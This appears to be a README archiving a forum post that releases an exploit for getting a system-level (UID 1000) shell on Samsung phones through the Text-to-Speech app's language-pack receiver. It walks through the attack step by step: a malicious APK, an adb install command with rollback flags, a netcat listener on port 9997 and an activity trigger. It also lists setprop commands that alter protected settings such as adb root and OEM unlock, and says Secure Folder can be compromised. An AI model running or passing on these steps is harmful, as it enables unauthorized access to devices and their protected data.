# K0mraid3s-System-Shell
As seen on XDA before the public disclousure was removed by XDA Moderators.
It will otherwise remain unchanged here as an archive.

This is expected to work for EVERY single Samsung Mobile Device made TO-DATE (01/19/2023)

THIS IS ACTIVELY IN DEVELOPMENT - Our goal is to make it more user friendly. and easier to use, so please note things will change and updates will come at any given time, and there is almost certainly bugs to be found and encountered along the way during this, so if you find issues, just let us know here or in support chat, we are VERY active, and can usually get back to you in a few mins. I Will be dynamically updating this repo as things progress, keeping it up-to-date with our current progress.


This is an EXPLOIT to get a System based shell (UID 1000) on ANY Samsung Mobile Device. No clue if or when it will be patched, but has worked on every single Samsung Device tested so far.
THIS IS THE EQUILIVELENT OF DOING su system but this DOES NOT invoke or need "su" in any way.
This DOES NOT trip Knox.
This DOES NOT give you ROOT (UID 0)
This DOES NOT directly unlock your bootloader, although you may be able to find a way to do so using this exploit as a tool.
If you use this for your own works, Please give credit.
Next best thing to root on devices without BootLoader Unlock Option.


Cool things that work:
Access to most of /efs /efs/imei /efs/sec_efs /efs/FactoryApp - Access to most of /data /data/system /data/user/0/ANY_SYSTEM_APP - The "Insthk" bin becomes useable, - Secure Folder/Separated Apps becomes COMPLETELY compromised if you also install the POC in it (UID 150_system) - start IOTHidden Menu, DM Mode, Service Mode, Multiple Debugging and hidden menus as well as preconfig in system context- Change many protected props, such as: 
setprop persist.service.adb.root 1
setprop service.adb.root 1
setprop sys.hidden.otatest 1
setprop sys.hiddenmenu.enable 1
setprop persist.sys.knox.device_owner true
setprop persist.sys.usb.qxdm.debug 1
setprop sys.usb.qxdm.debug 1
setprop presist.service.adb.enable 1
setprop persist.sys.usb.qxdm.debug 1
setprop service.adb.enable 1
setprop persist.rollback.is_test true
setprop sys.oem_unlock_allowed 1
aswell as quite a bit more.


Note* You need to be on Wifi or Hotspot to set this up.



Its fairly simple, a Typical Local Privilege escalation.


The Easy Way -
Step 1 - Download "Komraids System Shell.zip", (attached is the latest version) and extract anywhere on desktop.
Step 2 - Push the "samsungTTSVULN2.apk" to /data/local/tmp
Step 3 - Ensure USB Debugging is ON, and computer is authorized. Also make sure power saving is OFF.
Step 4 - Install komraids_POC_V1.5.apk, reboot device.
Step 5 - When device is fully rebooted and unlocked, run systemshell.exe
Step 6 - You should now be in a shell with UID 1000. Enjoy. Be careful with what you mess with.

Things to note: The.exe only needs to be run once after each reboot, you can use it if you prefer, or, you can manually open a system shell yourself, by following Step 5, from "How it works?" below.


How it works? (sh** for security researchers, devs etc)


Step 1 - Install the included "komraids_POC_V1.5.apk" to the device, then push the included "samsungTTSVULN2.apk" to /data/local/tmp (adb push samsungTTSVULN2.apk /data/local/tmp) -> I advice disabling all battery optimizations for Samsung TTS and Shell, otherwise, it cuts off the shell from time to time.

Step 2 - Make sure ADB is on, Connected and authorized and all power saving is off (as mentioned above) Reboot device.

Step 4 - When device reboots, run this command from ADB. adb shell pm install -r -d -f -g --full --install-reason 3 --enable-rollback /data/local/tmp/samsungTTSVULN2.apk ---> it will return "Success" when done.

Step 5 - Now, open two shells, in the first, do nc -lp 9997 & in the second, do am start -n com.samsung.SMT/.gui.DownloadList -> Look back at the first shell., it should have opened into a new system (UID 1000) shell.

SMT has a receiver that blindly accepts stuff, so a carefully crafted apk (Our "komraids_POC_v1.5.apk") can trick it into loading our neat lib which opens a shell for us on localhost port 9997!

NOTE: You can use something like AppManager, seen here, or another App installer/manager to launch the SMT activity in step 5, and make a shortcut to it on your home screen for easy of access.




You are now UID 1000. Enjoy.



FAQ
Why wont it connect/open the system shell?
Various reasons can cause this, one of the most common is "Battery Optimizations", a form of power saving that can kill our apps. Power Saving is the number one issue for problems with this exploit. Second most common is forgetting to sort out Wifi to STATIC and, believe it or not, turning on ADB. So make sure you either have a full battery and all power saving features are OFF, or are plugged in via USB.
Why does this exist?
Idk, it was supposed to have been patched back in 2019, obviously it wasn't sufficient.

How do I prevent someone from hacking me with this?
Simple, be Offensive, set it up and lock up the lib/port, once your using this exploit, no others can because they cant load a second lib of the same. (the vuln is the lang packs for samsung Text-to-speech, SMT's receiver blindly accepts sh**) -- or, Disable or Remove Samsung Text-To-Speech.

How do I use this in Termux or other Terminal Emulators?
You will need to use the manual way, as described in Step 5 of "How it works?"

I cant get it to work, can anyone help?
Yes, post here or go to our Telegram Group for support, here (click me)

Can this work with LSPosed/LSpatch?
Yes, but it has its limitations currently. I've tested a few modules myself, some work, some don't.

Will this work with Magisk or Shizuku?
Yes, But it depends on @topjohnwu and @Rikka, respectfully, to give the green light to me to incorporate this and post those here or post their compatible versions here on their own. I am open to working with them and have already seen and used a working Shizuku mod using this Exploit, but out of respect, I cannot share it yet.

Will you share the source code?
Yes, I have plans to setup a (public) GitHub repo for this in the near future.


How do i open Hidden stuff?
For now, we will need to do it manually, so try these from System shell
This opens IOTHiden menu
am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466
This opens CID Managers "Preconfig"
am start -n com.samsung.android.cidmanager/.modules.preconfig.PreconfigActivity -a com.samsung.android.action.SECRET_CODE -d secret_code://27262826 --ei type 2 
This opens the DM Mode on/off Toggle
am start -n com.sec.hiddenmenu/.DmMode -e 7267864872 72678647376477466
Ill add more interesting and useful commands/things to do as time goes on. Please do drop any cool things you find here!


BACK STORY:
Its full or drama and BS. I reported this to Samsung in October 2022, but they have decided this is GOOGLES problem and forgot to tell me their decision. LONG STORY CUT SHORT, Between the time Samsung decided this was GOOGLES problem and them telling me of that decision, somehow, "another external security researcher" reported this exact thing to google in the context it was their find. IDK who, nor do I really care at this point. Its done and over with, but stuff like this is what makes some security researches ever hesitant to share their finds, even with the shady vendors/OEMS.

Don't be dumb, I'm not responsible for any dumb sh*t you do.
PWNED - K0mraid3 2022-10-06 175216.png


Big shout out to @wr3cckl3ss1 and alll the others for the help testing, debugging and the massive amount more done to help get this right. It was truely a team effort and nothing less then a labor of love & passion for cybersecurity and learning. I learned more during this project with you guys then I can express.

Huge thanks to @oakieville for the .exe and alot of help tweaking the code of this project.


This project was brought to you by VAULT-TEC Dev Ops!
